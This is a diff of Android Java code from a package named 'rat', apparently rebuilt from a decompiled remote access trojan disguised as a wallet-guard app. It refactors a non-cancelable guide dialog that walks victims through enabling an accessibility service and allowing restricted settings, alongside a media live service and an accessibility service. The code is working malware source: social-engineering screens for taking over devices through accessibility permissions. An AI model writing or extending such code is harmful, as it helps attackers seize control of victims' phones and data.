@@ -5,7 +5,6 @@ package com.vendor.rat.activity;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
@@ -22,6 +21,7 @@ import android.widget.Toast;
 import com.vendor.rat.MainApplication;
 import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.control.service.MediaLiveService;
+import com.vendor.rat.helper.GuideDialogHelper;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SharedUtils;
 
@@ -67,8 +67,6 @@ public class ActivMain extends Activity {
     public Long lastBackPressTime;
 
     // ADAPT: vendor = utils/b 的静态字段，移到这里管理
-    // vendor: utils/b.f274a → guideDialogRef
-    private static WeakReference<AlertDialog> guideDialogRef;
     // vendor: utils/b.c → currentActivityRef
     private static volatile WeakReference<Activity> currentActivityRef;
     // vendor: utils/b.b → isRestricted (AtomicBoolean)
@@ -86,8 +84,18 @@ public class ActivMain extends Activity {
         requestWindowFeature(1);
 
         // vendor: #303133 背景 (3处设置)
-        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
-        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
+        int bgColor = GuideDialogHelper.COLOR_BG;
+        getWindow().getDecorView().setBackgroundColor(bgColor);
+        getWindow().setBackgroundDrawable(new ColorDrawable(bgColor));
+
+        // 对齐模板: 状态栏透明，内容延伸到状态栏下方（不隐藏状态栏）
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
+        getWindow().setStatusBarColor(Color.TRANSPARENT);
+        getWindow().setNavigationBarColor(Color.TRANSPARENT);
+        getWindow().getDecorView().setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
 
         // vendor: new e(getApplicationContext(), false) — 自定义 WebView
         AppWebView webView = new AppWebView(getApplicationContext(), false);
@@ -97,7 +105,7 @@ public class ActivMain extends Activity {
         WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
         layoutParams.width = -1;  // MATCH_PARENT
         layoutParams.height = -1; // MATCH_PARENT
-        linearLayout.setBackgroundColor(Color.parseColor("#303133"));
+        linearLayout.setBackgroundColor(GuideDialogHelper.COLOR_BG);
         setContentView(linearLayout, layoutParams);
 
         // vendor: this.f133a = new WeakReference(eVar)
@@ -507,56 +515,11 @@ public class ActivMain extends Activity {
         sendPermissionResponse(requestCode, granted ? 1 : 0);
     }
 
-    // ============ 引导弹窗 (vendor: utils/b.f(), 行 77-104) ============
+    // ============ 引导弹窗 (委托 GuideDialogHelper) ============
 
     private void showGuideDialog() {
-        // vendor: 如果已经在显示则跳过
-        WeakReference<AlertDialog> ref = guideDialogRef;
-        if (ref != null && ref.get() != null && ref.get().isShowing()) {
-            return;
-        }
-
         AppConfig config = getAppConfig();
-
-        // vendor: 从 BuildConfig 获取文本，默认英文
-        String alertTitle = (config == null || config.getAlertTitle() == null || config.getAlertTitle().isEmpty())
-                ? "Open [accessibility_service_label]"
-                : config.getAlertTitle();
-
-        String alertMsg = (config == null || config.getAlertMsg() == null || config.getAlertMsg().isEmpty())
-                ? "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]"
-                : config.getAlertMsg();
-
-        String okText = (config == null || config.getOkText() == null || config.getOkText().isEmpty())
-                ? "Go immediately"
-                : config.getOkText();
-
-        // vendor: AlertDialog.Builder(activity, 4) — 4 = THEME_DEVICE_DEFAULT_DARK
-        AlertDialog.Builder builder = new AlertDialog.Builder(this, 4);
-
-        // vendor: builder.setCustomTitle(new e0.a(activity, alertTitle))
-        // TODO: VENDOR_VERIFY — vendor 用自定义 LinearLayout 标题视图 (含图标+文本)
-        // 当前简化为 setTitle，后续可替换为自定义 View
-        builder.setTitle(alertTitle);
-
-        builder.setMessage(alertMsg);
-        builder.setCancelable(false);
-
-        // vendor: 如果 isRestricted=false，显示 "Allow restricted settings" 按钮
-        if (!isRestricted.get()) {
-            String restrictedText = (config == null || config.getAllowRestricted() == null || config.getAllowRestricted().isEmpty())
-                    ? "Allow restricted settings"
-                    : config.getAllowRestricted();
-            builder.setNeutralButton(restrictedText, (dialog, which) -> {
-                // vendor: new com.guard.wallet.helper.j(1) — 打开受限设置
-                // TODO: VENDOR_VERIFY — 受限设置跳转逻辑
-                Log.d(TAG, "Allow restricted settings clicked");
-            });
-        }
-
-        // vendor: "Go immediately" → 跳转无障碍设置
-        builder.setPositiveButton(okText, (dialog, which) -> {
-            // vendor: new com.guard.wallet.helper.j(2) — 跳转无障碍设置
+        GuideDialogHelper.show(this, config, isRestricted.get(), () -> {
             try {
                 Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -565,28 +528,10 @@ public class ActivMain extends Activity {
                 Log.e(TAG, "Failed to open accessibility settings", e);
             }
         });
-
-        // vendor: builder.setOnDismissListener / setOnCancelListener
-        builder.setOnDismissListener(dialog -> {
-            // vendor: new com.guard.wallet.helper.k(1)
-        });
-        builder.setOnCancelListener(dialog -> {
-            // vendor: new a()
-        });
-
-        WeakReference<AlertDialog> dialogRef = new WeakReference<>(builder.create());
-        guideDialogRef = dialogRef;
-        dialogRef.get().show();
     }
 
-    // vendor: utils/b.b() — 关闭引导弹窗
     private static void dismissGuideDialog() {
-        WeakReference<AlertDialog> ref = guideDialogRef;
-        if (ref == null || ref.get() == null) {
-            return;
-        }
-        ref.get().dismiss();
-        guideDialogRef = null;
+        GuideDialogHelper.dismiss();
     }
 
     // ============ 辅助方法 ============
